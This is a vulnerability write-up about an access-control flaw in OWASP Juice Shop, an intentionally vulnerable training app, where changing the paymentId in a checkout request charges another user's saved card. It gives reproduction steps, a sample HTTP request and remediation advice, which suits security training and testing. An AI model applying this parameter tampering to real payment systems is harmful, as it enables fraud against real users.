
# Vulnerability Report: Use Other Users' Card for Payment  
**Category:** A01 – Broken Access Control (IDOR)

---
## Overview
An **IDOR vulnerability** exists in the checkout process of OWASP Juice Shop.  
By modifying the `paymentId` parameter in the checkout request, an attacker can use **another user’s saved payment card** to complete purchases.

---
## Proof of Concept

### Steps to Reproduce
1. Log in as a normal user and add items to the basket.  
2. At checkout, intercept the request using Burp Suite.  
3. Change the `paymentId` to another user’s card ID (e.g., `1`).  
4. Forward the modified request.  
5. The order is processed successfully using the victim’s card.

### Example Request
```http
POST /rest/basket/6/checkout HTTP/1.1
Host: localhost:3000
Authorization: Bearer <valid_token>
Content-Type: application/json
```
```json
{
    "couponData":"bnVsbA==",
    "orderDetails":{
        "paymentId":"1",
        "addressId":"7",
        "deliveryMethodId":"1"
    }
}
```

### Example Outcome
- The attacker’s basket is checked out using the **victim’s saved payment card**.  

---
## Impact
- **Financial fraud:** Attackers can steal money by charging other users’ cards.  
- **Reputation loss:** The platform could face legal and trust issues due to unauthorized charges.  
- **Privilege escalation:** Attackers gain the ability to impersonate and spend on behalf of other users.  

**Severity:** Critical  

---
## Recommendations
1. **Enforce strict ownership checks**: Ensure that the `paymentId` belongs to the authenticated user before processing.  
2. **Do not trust client-supplied identifiers**: Derive payment method and ownership from the session, not user input.  
3. **Add authorization middleware** to validate access to sensitive objects (cards, addresses, orders).  
4. **Enable monitoring and alerts** for suspicious checkout activities, such as repeated failures or mismatched accounts.  
